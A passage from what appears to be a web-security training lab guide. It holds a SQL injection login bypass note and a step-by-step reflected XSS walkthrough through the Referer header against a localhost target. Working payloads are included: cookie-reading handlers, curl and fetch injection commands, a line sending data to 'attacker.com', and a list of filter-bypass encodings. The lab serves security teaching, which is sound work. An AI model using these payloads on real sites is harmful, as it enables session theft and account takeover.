Vulnerability Location: /lab7/2/login
Parameter: 'username' (username field in login form)
Query Template: SELECT * FROM lab7_office_users WHERE username = '{username}' AND password = '{password}'

Resulting Query: SELECT * FROM lab7_office_users WHERE username = 'admin_office' (password check ignored)

================================================================================
               LAB 8: STEP-BY-STEP EXPLOITATION GUIDE
================================================================================

GENERAL APPROACH FOR ALL LAB 8.1 VARIATIONS
=============================================

Lab 8 focuses on Reflected XSS vulnerabilities where user input is reflected back 
in the HTTP response without proper sanitization. The goal is to inject JavaScript 
code that executes in the victim's browser. Each variation uses a different 
reflection point and injection context.

TOOLS REQUIRED:
- Web Browser (Chrome, Firefox, or Edge)
- Browser Developer Tools (F12)
- Burp Suite or OWASP ZAP (optional, for advanced testing)
- Text Editor or Notepad


================================================================================
         LAB 8.1A - CONTACT FORM (HTTP HEADER REFLECTION XSS)
================================================================================

SCENARIO:
The ContactForm application reflects the HTTP Referer header in the 
confirmation page without sanitization.

STEP-BY-STEP EXPLOITATION:

Step 1: Identify the Vulnerable Endpoint
- Navigate to: http://localhost:8000/lab8/1/contact-submit
- This is the endpoint that processes contact form submissions

Step 2: Understand the Vulnerability
- The application takes the 'Referer' HTTP header (sent by the browser)
- It reflects this value directly into the HTML response
- No sanitization or encoding is performed
- The reflected content is inserted into HTML attributes

Step 3: Craft the XSS Payload
- The Referer header is reflected in an HTML attribute context
- You need to break out of the attribute and inject JavaScript
- Payload Example 1: " onload="alert('XSS in Referer')
- Payload Example 2: " ><script>alert('Header XSS')</script><span class="
- Payload Example 3: " onerror="alert(document.cookie)

Step 4: Exploit Using Browser DevTools
4.1) Open your browser and press F12 to open Developer Tools
4.2) Go to the Console tab
4.3) Execute a fetch request with custom headers:
     fetch('http://localhost:8000/lab8/1/contact-submit', {
       method: 'POST',
       headers: {
         'Referer': '\\" onload=\\"alert(\\'XSS in Header\\')\\"'
       }
     })

Step 5: Alternative: Manual Exploitation with Curl
- Use curl or Postman to send a request with malicious Referer header:
  curl -H "Referer: \" onload=\"alert('XSS')\"" \
       -X POST http://localhost:8000/lab8/1/contact-submit

Step 6: Verify the Vulnerability
- Check the response HTML
- Look for the Referer value reflected without proper encoding
- If JavaScript executes, the vulnerability is confirmed

Step 7: Extract the Flag
- Modify the payload to extract sensitive data
- Example: " onload="fetch('http://attacker.com/steal?flag='+document.location.hash)"
- The application will display the flag in the response

ALTERNATIVE PAYLOADS TO TRY:
- " autofocus onfocus="alert('XSS')"
- " ><img src=x onerror="alert('XSS')">
- " ><svg onload="alert('XSS')">
- " ><body onload="alert('XSS')">

================================================================================
                    GENERAL XSS PAYLOAD ARCHIVE
================================================================================

EVENT HANDLER PAYLOADS (for various contexts):
- onload, onerror, onfocus, onblur, onchange, onsubmit
- onmouseover, onmouseenter, onmouseleave, onmouseout
- onkeydown, onkeyup, onkeypress
- ondblclick, oncontextmenu, oncopy, onpaste
- onwheel, ondrag, ondrop
- onplay, onpause, onplaying, onended
- ontouchstart, ontouchend, ontouchmove

ENCODING BYPASS TECHNIQUES:
- URL Encoding: %3Cscript%3E = <script>
- HTML Entity Encoding: &#60;script&#62; = <script>
- Mixed Case: <ScRiPt>, <SCRIPT>, <Script>
- Comments: <script<!--/-->>, <s<!---->cript>
- Tab/Newline Injection: <script\n>, <script\t>
- Data URI: data:text/html,<script>alert('XSS')</script>
- Protocol Handlers: vbscript:, about:, data:

EXFILTRATION METHODS:
- fetch() to send data to attacker server
- new Image().src to send URL parameters
- navigator.sendBeacon() for reliable background requests
- WebSockets for two-way communication
- XMLHttpRequest for requests

FLAG RETRIEVAL:
- Most labs display the flag immediately upon successful XSS
- The flag appears in:
  * Alert boxes (alert(flag))
  * Console messages (console.log)
  * Response from the server
  * DOM elements
